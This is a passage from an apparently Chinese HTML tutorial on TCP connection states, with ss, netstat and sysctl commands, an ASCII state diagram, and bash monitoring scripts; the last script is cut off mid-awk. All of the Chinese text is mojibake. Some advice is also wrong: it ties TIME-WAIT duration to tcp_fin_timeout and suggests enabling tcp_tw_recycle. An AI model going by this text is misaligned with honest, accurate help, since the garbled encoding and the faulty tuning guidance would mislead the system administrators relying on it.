<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>0A</code>ï¼ˆåå…­è¿›åˆ¶ï¼‰/ <code>10</code>ï¼ˆåè¿›åˆ¶ï¼‰</li>
<li><strong>å«ä¹‰</strong>ï¼šæœåŠ¡å™¨ç«¯ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šè°ƒç”¨ <code>listen()</code> ç³»ç»Ÿè°ƒç”¨å</li>
<li><strong>æŸ¥çœ‹æ–¹æ³•</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash">ss -lnt      <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰ç›‘å¬ç«¯å£</span>
netstat -lnt
</code></pre>
</li>
<li><strong>å…¸å‹åœºæ™¯</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># WebæœåŠ¡å™¨ç›‘å¬</span>
Proto Recv-Q Send-Q Local Address:Port  Peer Address:Port  
tcp   0      0      *:80                *:*              LISTEN
</code></pre>
</li>
</ul>
<h3 data-id="heading-2"><strong>SYN-SENT (åŒæ­¥å·²å‘é€)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>02</code> / <code>2</code></li>
<li><strong>å«ä¹‰</strong>ï¼šå®¢æˆ·ç«¯å‘é€ SYN åç­‰å¾…æœåŠ¡å™¨å›å¤</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šè°ƒç”¨ <code>connect()</code> åï¼Œå‘é€ SYN åŒ…</li>
<li><strong>æŒç»­æ—¶é—´</strong>ï¼šé€šå¸¸å¾ˆçŸ­ï¼ˆRTT + å¤„ç†æ—¶é—´ï¼‰</li>
<li><strong>é—®é¢˜è¯Šæ–­</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¤§é‡SYN-SENTå¯èƒ½è¡¨ç¤ºï¼š</span>
<span class="hljs-comment"># 1. æœåŠ¡å™¨æœªå“åº”</span>
<span class="hljs-comment"># 2. é˜²ç«å¢™é˜»æ­¢</span>
ss -ant | grep -c SYN-SENT
</code></pre>
</li>
</ul>
<h3 data-id="heading-3"><strong>SYN-RECEIVED (åŒæ­¥å·²æ¥æ”¶)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>03</code> / <code>3</code></li>
<li><strong>åˆ«å</strong>ï¼šSYN-RCVD</li>
<li><strong>å«ä¹‰</strong>ï¼šæœåŠ¡å™¨æ”¶åˆ° SYNï¼Œå‘é€ SYN+ACK åç­‰å¾…å®¢æˆ·ç«¯ ACK</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šæœåŠ¡å™¨æ”¶åˆ° SYNï¼Œå‘é€ SYN+ACK å</li>
<li><strong>åŠè¿æ¥é˜Ÿåˆ—</strong>ï¼šå¤„äºæ­¤çŠ¶æ€çš„è¿æ¥åœ¨<strong>åŠè¿æ¥é˜Ÿåˆ—</strong>ï¼ˆSYN Queueï¼‰</li>
<li><strong>å®‰å…¨æ³¨æ„</strong>ï¼š<strong>SYN Flood æ”»å‡»</strong>çš„ç›®æ ‡çŠ¶æ€</li>
<li><strong>è°ƒä¼˜å‚æ•°</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash">sysctl net.ipv4.tcp_max_syn_backlog    <span class="hljs-comment"># åŠè¿æ¥é˜Ÿåˆ—å¤§å°</span>
sysctl net.ipv4.tcp_syncookies         <span class="hljs-comment"># é˜²å¾¡SYN Flood</span>
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-4"><strong>2. è¿æ¥å·²å»ºç«‹é˜¶æ®µ</strong></h2>
<h3 data-id="heading-5"><strong>ESTABLISHED (å·²å»ºç«‹è¿æ¥)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>01</code> / <code>1</code></li>
<li><strong>å«ä¹‰</strong>ï¼šè¿æ¥å·²å»ºç«‹ï¼Œå¯ä»¥æ­£å¸¸ä¼ è¾“æ•°æ®</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šå®Œæˆä¸‰æ¬¡æ¡æ‰‹å</li>
<li><strong>å…¨è¿æ¥é˜Ÿåˆ—</strong>ï¼šä» SYN-RCVD ç§»å…¥<strong>å…¨è¿æ¥é˜Ÿåˆ—</strong>ï¼ˆAccept Queueï¼‰</li>
<li><strong>æŸ¥çœ‹è¯¦ç»†</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰å·²å»ºç«‹è¿æ¥</span>
ss -nt
<span class="hljs-comment"># æŒ‰è¿›ç¨‹æŸ¥çœ‹</span>
ss -ntp
</code></pre>
</li>
<li><strong>æ•°æ®ä¼ è¾“</strong>ï¼š
<pre><code class="hljs language-lua" lang="lua">å®¢æˆ·ç«¯                                   æœåŠ¡å™¨
  |           ESTABLISHED              |
  | &lt;<span class="hljs-comment">-------------------------------&gt; |</span>
  |         æ•°æ®è‡ªç”±æµåŠ¨               |
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-6"><strong>3. è¿æ¥å…³é—­é˜¶æ®µï¼ˆæ­£å¸¸å…³é—­ï¼‰</strong></h2>
<h3 data-id="heading-7"><strong>FIN-WAIT-1 (ç»“æŸç­‰å¾…1)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>04</code> / <code>4</code></li>
<li><strong>å«ä¹‰</strong>ï¼šä¸»åŠ¨å…³é—­æ–¹å‘é€ FIN åï¼Œç­‰å¾…å¯¹æ–¹ ACK</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šè°ƒç”¨ <code>close()</code> æˆ– <code>shutdown(SHUT_WR)</code></li>
<li><strong>å¯èƒ½è½¬æ¢</strong>ï¼š
<pre><code class="hljs language-scss" lang="scss">FIN-WAIT-<span class="hljs-number">1</span> â†’ FIN-WAIT-<span class="hljs-number">2</span>      # æ”¶åˆ°ACK
FIN-WAIT-<span class="hljs-number">1</span> â†’ CLOSING         # åŒæ—¶æ”¶åˆ°FINï¼ˆåŒæ—¶å…³é—­ï¼‰
FIN-WAIT-<span class="hljs-number">1</span> â†’ <span class="hljs-selector-tag">TIME</span>-WAIT       # æ”¶åˆ°FIN+ACK
</code></pre>
</li>
</ul>
<h3 data-id="heading-8"><strong>FIN-WAIT-2 (ç»“æŸç­‰å¾…2)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>05</code> / <code>5</code></li>
<li><strong>å«ä¹‰</strong>ï¼šæ”¶åˆ°å¯¹æ–¹å¯¹ FIN çš„ ACKï¼Œç­‰å¾…å¯¹æ–¹å‘é€ FIN</li>
<li><strong>æŒç»­æ—¶é—´</strong>ï¼šå¯ä¿æŒè¾ƒé•¿æ—¶é—´ï¼ˆå¯¹æ–¹è¿˜æœªè°ƒç”¨ closeï¼‰</li>
<li><strong>æŸ¥çœ‹</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å¤„äºæ­¤çŠ¶æ€çš„è¿æ¥</span>
ss -ant | grep FIN-WAIT-2
</code></pre>
</li>
<li><strong>é—®é¢˜</strong>ï¼šè¿‡å¤šè¿æ¥å¯èƒ½å¯¼è‡´èµ„æºè€—å°½
<pre><code class="hljs language-bash" lang="bash">sysctl net.ipv4.tcp_fin_timeout  <span class="hljs-comment"># é»˜è®¤60ç§’</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-9"><strong>CLOSE-WAIT (å…³é—­ç­‰å¾…)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>08</code> / <code>8</code></li>
<li><strong>å«ä¹‰</strong>ï¼šè¢«åŠ¨å…³é—­æ–¹æ”¶åˆ° FIN åï¼Œç­‰å¾…åº”ç”¨å±‚å…³é—­</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šæ”¶åˆ°å¯¹æ–¹çš„ FINï¼Œå‘é€ ACK å</li>
<li><strong>å…³é”®é—®é¢˜</strong>ï¼š<strong>åº”ç”¨å±‚æœªåŠæ—¶å…³é—­è¿æ¥</strong>ä¼šå¯¼è‡´å¤§é‡ CLOSE-WAIT
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ’æŸ¥æ–¹æ³•</span>
ss -ant | grep CLOSE-WAIT
<span class="hljs-comment"># æ‰¾åˆ°å¯¹åº”è¿›ç¨‹</span>
ss -antp | grep CLOSE-WAIT

<span class="hljs-comment"># å¸¸è§åŸå› ï¼šæœªè°ƒç”¨ close()ï¼Œè¿æ¥æ³„æ¼</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-10"><strong>CLOSING (æ­£åœ¨å…³é—­)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>0B</code> / <code>11</code></li>
<li><strong>å«ä¹‰</strong>ï¼šåŒæ–¹<strong>åŒæ—¶å°è¯•å…³é—­</strong>è¿æ¥ï¼ˆç½•è§ï¼‰</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼š
<pre><code class="hljs language-lua" lang="lua">åŒæ–¹å‡ ä¹åŒæ—¶å‘é€FIN
å®¢æˆ·ç«¯: FIN-WAIT<span class="hljs-number">-1</span> <span class="hljs-comment">--å‘é€FIN--&gt; æœåŠ¡å™¨</span>
æœåŠ¡å™¨: FIN-WAIT<span class="hljs-number">-1</span> <span class="hljs-comment">--å‘é€FIN--&gt; å®¢æˆ·ç«¯</span>
åŒæ–¹æ”¶åˆ°å¯¹æ–¹FINåè¿›å…¥CLOSING
</code></pre>
</li>
<li><strong>æŸ¥çœ‹</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é€šå¸¸å¾ˆå°‘è§</span>
ss -ant | grep -c CLOSING
</code></pre>
</li>
</ul>
<h3 data-id="heading-11"><strong>LAST-ACK (æœ€åç¡®è®¤)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>09</code> / <code>9</code></li>
<li><strong>å«ä¹‰</strong>ï¼šè¢«åŠ¨å…³é—­æ–¹å‘é€è‡ªå·±çš„ FIN åï¼Œç­‰å¾…æœ€å ACK</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šCLOSE-WAIT çŠ¶æ€çš„åº”ç”¨è°ƒç”¨ close() å</li>
<li><strong>è½¬æ¢</strong>ï¼šæ”¶åˆ° ACK åè¿›å…¥ CLOSED</li>
</ul>
<h3 data-id="heading-12"><strong>TIME-WAIT (æ—¶é—´ç­‰å¾…)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>06</code> / <code>6</code></li>
<li><strong>å«ä¹‰</strong>ï¼šä¸»åŠ¨å…³é—­æ–¹æ”¶åˆ°å¯¹æ–¹çš„ FIN å¹¶å‘é€ ACK å</li>
<li><strong>æŒç»­æ—¶é—´</strong>ï¼š<strong>2MSL</strong>ï¼ˆMaximum Segment Lifetimeï¼‰
<ul>
<li>é»˜è®¤ï¼š<code>60ç§’</code>ï¼ˆLinuxï¼‰</li>
<li>æŸ¥çœ‹ï¼š<code>sysctl net.ipv4.tcp_fin_timeout</code></li>
</ul>
</li>
<li><strong>ç›®çš„</strong>ï¼š
<ol>
<li>ç¡®ä¿å¯¹æ–¹æ”¶åˆ°æœ€åçš„ ACK</li>
<li>è®©æ—§è¿æ¥çš„æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­æ¶ˆå¤±</li>
</ol>
</li>
<li><strong>æŸ¥çœ‹å’Œç®¡ç†</strong>ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç»Ÿè®¡æ•°é‡</span>
ss -ant | grep -c TIME-WAIT

<span class="hljs-comment"># æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</span>
ss -ant state time-wait

<span class="hljs-comment"># è°ƒä¼˜å‚æ•°</span>
sysctl net.ipv4.tcp_tw_reuse      <span class="hljs-comment"># é‡ç”¨TIME-WAITè¿æ¥</span>
sysctl net.ipv4.tcp_tw_recycle    <span class="hljs-comment"># å¿«é€Ÿå›æ”¶ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</span>
sysctl net.ipv4.tcp_max_tw_buckets <span class="hljs-comment"># é™åˆ¶æ•°é‡</span>
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-13"><strong>4. ç‰¹æ®Š/ç»ˆæ­¢çŠ¶æ€</strong></h2>
<h3 data-id="heading-14"><strong>CLOSED (å…³é—­)</strong></h3>
<ul>
<li><strong>çŠ¶æ€å€¼</strong>ï¼š<code>07</code> / <code>7</code></li>
<li><strong>å«ä¹‰</strong>ï¼šè¿æ¥å®Œå…¨å…³é—­ï¼Œæ— èµ„æºå ç”¨</li>
<li><strong>æ³¨æ„</strong>ï¼šç»Ÿè®¡ä¸­é€šå¸¸çœ‹ä¸åˆ°ï¼Œå› ä¸ºå·²é‡Šæ”¾èµ„æº</li>
</ul>
<hr/>
<h2 data-id="heading-15"><strong>çŠ¶æ€è½¬æ¢å›¾è¯¦è§£</strong></h2>
<pre><code class="hljs language-sql" lang="sql">                              <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
                              <span class="hljs-operator">|</span>  CLOSED <span class="hljs-operator">|</span>
                              <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
                  è¢«åŠ¨æ‰“å¼€        <span class="hljs-operator">|</span>     ä¸»åŠ¨æ‰“å¼€
                   LISTEN        <span class="hljs-operator">|</span>     SYN<span class="hljs-operator">-</span>SENT
                     <span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                     v           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                <span class="hljs-operator">+</span><span class="hljs-comment">---------+      |        |</span>
                <span class="hljs-operator">|</span>  LISTEN <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                <span class="hljs-operator">+</span><span class="hljs-comment">---------+      |        |</span>
          æ”¶åˆ°SYN   <span class="hljs-operator">|</span>             <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
             å‘é€SYN<span class="hljs-operator">+</span>ACK <span class="hljs-operator">|</span>             <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                     <span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                     v           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
               <span class="hljs-operator">+</span><span class="hljs-comment">-----------+     |        |</span>
               <span class="hljs-operator">|</span>SYN<span class="hljs-operator">-</span>RECEIVED<span class="hljs-operator">|</span><span class="hljs-operator">&lt;</span><span class="hljs-comment">---|--------+</span>
               <span class="hljs-operator">+</span><span class="hljs-comment">-----------+     |  æ”¶åˆ°ACK</span>
          æ”¶åˆ°ACK   <span class="hljs-operator">|</span>             <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
              v           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+     |        |</span>
          <span class="hljs-operator">|</span>ESTABLISHED<span class="hljs-operator">|</span><span class="hljs-operator">&lt;</span><span class="hljs-comment">--+--------+</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+             è¿æ¥å»ºç«‹å®Œæˆ</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>     åº”ç”¨æ•°æ®ä¼ è¾“       <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>    ä¸»åŠ¨å…³é—­           è¢«åŠ¨å…³é—­
              <span class="hljs-operator">|</span>   å‘é€FIN             æ”¶åˆ°FIN
              <span class="hljs-operator">|</span>                      å‘é€ACK
              v                       <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +-----------+</span>
          <span class="hljs-operator">|</span>FIN<span class="hljs-operator">-</span>WAIT<span class="hljs-number">-1</span><span class="hljs-operator">|</span>              <span class="hljs-operator">|</span> <span class="hljs-keyword">CLOSE</span><span class="hljs-operator">-</span>WAIT<span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +-----------+</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
   æ”¶åˆ°ACK     <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>åº”ç”¨è°ƒç”¨<span class="hljs-keyword">close</span>
              v                       <span class="hljs-operator">|</span>å‘é€FIN
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
          <span class="hljs-operator">|</span>FIN<span class="hljs-operator">-</span>WAIT<span class="hljs-number">-2</span><span class="hljs-operator">|</span>              <span class="hljs-operator">|</span><span class="hljs-keyword">LAST</span><span class="hljs-operator">-</span>ACK <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
   æ”¶åˆ°FIN     <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>æ”¶åˆ°ACK
   å‘é€ACK     <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
              v                       v
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
          <span class="hljs-operator">|</span><span class="hljs-type">TIME</span><span class="hljs-operator">-</span>WAIT<span class="hljs-operator">|</span>               <span class="hljs-operator">|</span>  CLOSED <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
              <span class="hljs-operator">|</span>  ç­‰å¾…<span class="hljs-number">2</span>MSL
              v
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
          <span class="hljs-operator">|</span>  CLOSED <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
</code></pre>
<hr/>
<h2 data-id="heading-16"><strong>å®Œæ•´æŸ¥çœ‹è„šæœ¬</strong></h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># tcp_state_detailed.sh</span>
<span class="hljs-comment"># æŸ¥çœ‹è¯¦ç»†çš„TCPçŠ¶æ€ç»Ÿè®¡</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"================================================"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"            TCP è¿æ¥çŠ¶æ€è¯¦ç»†ç»Ÿè®¡"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"================================================"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># ä½¿ç”¨ ss æŸ¥çœ‹ï¼ˆæ¨èï¼‰</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ã€æ–¹æ³•1: ss å‘½ä»¤ã€‘"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"çŠ¶æ€             æ•°é‡   æè¿°"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"-----------------------"</span>
ss -ant | awk <span class="hljs-string">'NR&gt;1 {print $2}'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> count state; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">case</span> <span class="hljs-variable">$state</span> <span class="hljs-keyword">in</span>
        LISTEN)     desc=<span class="hljs-string">"ç›‘å¬ç«¯å£ï¼Œç­‰å¾…è¿æ¥"</span> ;;
        SYN-SENT)   desc=<span class="hljs-string">"å®¢æˆ·ç«¯å·²å‘é€SYN"</span> ;;
        SYN-RECV)   desc=<span class="hljs-string">"æœåŠ¡å™¨æ”¶åˆ°SYNï¼Œå·²å›å¤SYN+ACK"</span> ;;
        ESTAB)      desc=<span class="hljs-string">"è¿æ¥å·²å»ºç«‹ï¼Œæ•°æ®ä¼ è¾“ä¸­"</span> ;;
        FIN-WAIT-1) desc=<span class="hljs-string">"ä¸»åŠ¨å…³é—­æ–¹å‘é€FINï¼Œç­‰å¾…ACK"</span> ;;
        FIN-WAIT-2) desc=<span class="hljs-string">"æ”¶åˆ°FINçš„ACKï¼Œç­‰å¾…å¯¹æ–¹FIN"</span> ;;
        TIME-WAIT)  desc=<span class="hljs-string">"ç­‰å¾…2MSLï¼Œç¡®ä¿è¿æ¥å®Œå…¨å…³é—­"</span> ;;
        CLOSED)     desc=<span class="hljs-string">"è¿æ¥å®Œå…¨å…³é—­"</span> ;;
        CLOSE-WAIT) desc=<span class="hljs-string">"è¢«åŠ¨å…³é—­æ–¹æ”¶åˆ°FINï¼Œç­‰å¾…åº”ç”¨å…³é—­"</span> ;;
        LAST-ACK)   desc=<span class="hljs-string">"è¢«åŠ¨å…³é—­æ–¹å‘é€FINï¼Œç­‰å¾…æœ€åACK"</span> ;;
        CLOSING)    desc=<span class="hljs-string">"åŒæ–¹åŒæ—¶å°è¯•å…³é—­"</span> ;;
        UNKNOWN)    desc=<span class="hljs-string">"æœªçŸ¥çŠ¶æ€"</span> ;;
        *)          desc=<span class="hljs-string">""</span> ;;
    <span class="hljs-keyword">esac</span>
    <span class="hljs-built_in">printf</span> <span class="hljs-string">"%-12s %6d    %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">$state</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$count</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$desc</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ã€æ–¹æ³•2: /proc/net/tcp åŸå§‹æ•°æ®ã€‘"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"çŠ¶æ€(åå…­è¿›åˆ¶) æ•°é‡"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"-------------------"</span>
awk <span class="hljs-string">'{print $4}'</span> /proc/net/tcp | awk -F: <span class="hljs-string">'{print $1}'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> count hex_state; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">case</span> <span class="hljs-variable">$hex_state</span> <span class="hljs-keyword">in</span>
        0A) state=<span class="hljs-string">"LISTEN"</span> ;;
        01) state=<span class="hljs-string">"ESTABLISHED"</span> ;;
        02) state=<span class="hljs-string">"SYN_SENT"</span> ;;
        03) state=<span class="hljs-string">"SYN_RECV"</span> ;;
        04) state=<span class="hljs-string">"FIN_WAIT1"</span> ;;
        05) state=<span class="hljs-string">"FIN_WAIT2"</span> ;;
        06) state=<span class="hljs-string">"TIME_WAIT"</span> ;;
        07) state=<span class="hljs-string">"CLOSE"</span> ;;
        08) state=<span class="hljs-string">"CLOSE_WAIT"</span> ;;
        09) state=<span class="hljs-string">"LAST_ACK"</span> ;;
        0B) state=<span class="hljs-string">"CLOSING"</span> ;;
        *)  state=<span class="hljs-string">"UNKNOWN(<span class="hljs-variable">$hex_state</span>)"</span> ;;
    <span class="hljs-keyword">esac</span>
    <span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %6s    %6d\n"</span> <span class="hljs-string">"<span class="hljs-variable">$hex_state</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$state</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$count</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ã€å…³é”®æŒ‡æ ‡ç›‘æ§ã€‘"</span>
total=$(ss -ant | grep -c -v State)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æ€»TCPè¿æ¥æ•°: <span class="hljs-variable">$total</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># ç›‘æ§å»ºè®®</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ã€å¥åº·æ£€æŸ¥å»ºè®®ã€‘"</span>
close_wait=$(ss -ant state close-wait | grep -c -v State)
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$close_wait</span> -gt 100 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âš ï¸  è­¦å‘Š: CLOSE-WAIT è¿‡å¤š(<span class="hljs-variable">$close_wait</span>)ï¼Œå¯èƒ½å­˜åœ¨è¿æ¥æ³„æ¼"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   æ’æŸ¥æ–¹æ³•:"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   1. ss -antp state close-wait"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   2. æ£€æŸ¥å¯¹åº”åº”ç”¨çš„è¿æ¥å…³é—­é€»è¾‘"</span>
<span class="hljs-keyword">fi</span>

time_wait=$(ss -ant state time-wait | grep -c -v State)
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$time_wait</span> -gt 10000 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âš ï¸  è­¦å‘Š: TIME-WAIT è¿‡å¤š(<span class="hljs-variable">$time_wait</span>)ï¼Œå¯èƒ½å½±å“æ–°è¿æ¥"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   ä¼˜åŒ–å»ºè®®:"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   1. sysctl net.ipv4.tcp_tw_reuse=1"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   2. sysctl net.ipv4.tcp_max_tw_buckets=2000000"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<hr/>
<h2 data-id="heading-17"><strong>çŠ¶æ€è¯Šæ–­ä¸è°ƒä¼˜</strong></h2>
<h3 data-id="heading-18"><strong>å¸¸è§é—®é¢˜åŠè§£å†³</strong></h3>
<h4 data-id="heading-19"><strong>é—®é¢˜1ï¼šå¤§é‡ TIME-WAIT</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸå› ï¼šçŸ­è¿æ¥è¿‡å¤š</span>
<span class="hljs-comment"># è§£å†³ï¼š</span>
sysctl -w net.ipv4.tcp_tw_reuse=1      <span class="hljs-comment"># é‡ç”¨</span>
sysctl -w net.ipv4.tcp_tw_recycle=1    <span class="hljs-comment"># å›æ”¶ï¼ˆNATç¯å¢ƒæ…ç”¨ï¼‰</span>
sysctl -w net.ipv4.tcp_max_tw_buckets=2000000
</code></pre>
<h4 data-id="heading-20"><strong>é—®é¢˜2ï¼šå¤§é‡ CLOSE-WAIT</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸå› ï¼šåº”ç”¨æœªæ­£ç¡®å…³é—­è¿æ¥</span>
<span class="hljs-comment"># æ’æŸ¥ï¼š</span>
lsof -nP -iTCP -sTCP:CLOSE_WAIT
<span class="hljs-comment"># æˆ–</span>
ss -antp state close-wait
<span class="hljs-comment"># æ£€æŸ¥å¯¹åº”è¿›ç¨‹çš„ä»£ç </span>
</code></pre>
<h4 data-id="heading-21"><strong>é—®é¢˜3ï¼šå¤§é‡ SYN-RECV</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸå› ï¼šå¯èƒ½é­å—SYN Floodæ”»å‡»</span>
<span class="hljs-comment"># é˜²å¾¡ï¼š</span>
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.tcp_max_syn_backlog=4096
sysctl -w net.ipv4.tcp_synack_retries=2
</code></pre>
<hr/>
<h2 data-id="heading-22"><strong>çŠ¶æ€ç›‘æ§å·¥å…·</strong></h2>
<h3 data-id="heading-23"><strong>å®æ—¶ç›‘æ§è„šæœ¬</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># å®æ—¶ç›‘æ§TCPçŠ¶æ€å˜åŒ–</span>
watch -n 1 <span class="hljs-string">'
echo "TCPçŠ¶æ€å®æ—¶ç›‘æ§ - $(date)"
echo "----------------------------------------"
ss -ant | awk '</span>\<span class="hljs-string">''</span>NR&gt;1 {count[<span class="hljs-variable">$2</span>]++} END {
    states[<span class="hljs-string">"LISTEN"</span>]=<span class="hljs-string">"ç›‘å¬"</span>;
    states[<span class="hljs-string">"SYN-SENT"</span>]=<span class="hljs-string">"å‘SYN"</span>;
    states[<span class="hljs-string">"SYN-RECV"</span>]=<span class="hljs-string">"æ”¶SYN"</span>;
    states[<span class="hljs-string">"ESTAB"</span>]=<span class="hljs-string">"å·²è¿æ¥"</span>;
    states[<span class="hljs-string">"FIN-WAIT-1"</span>]=<span class="hljs-string">"ç­‰FIN-ACK"</span>;
    states[<span class="hljs-string">"FIN-WAIT-2"</span>]=<span class="hljs-string">"ç­‰å¯¹æ–¹FIN"</span>;
    states[<span class="hljs-string">"TIME-WAIT"</span>]=<span class="hljs-string">"ç­‰2MSL"</span>;
    states[<span class="hljs-string">"CLOSE-WAIT"</span>]=<span class="hljs-string">"ç­‰åº”ç”¨å…³"</span>;
    states[<span class="hljs-string">"LAST-ACK"</span>]=<span class="hljs-string">"ç­‰æœ€åACK"</span>;
    states[<span class="hljs-string">"CLOSING"</span>]=<span class="hljs-string">"åŒæ—¶å…³é—­"</span>;
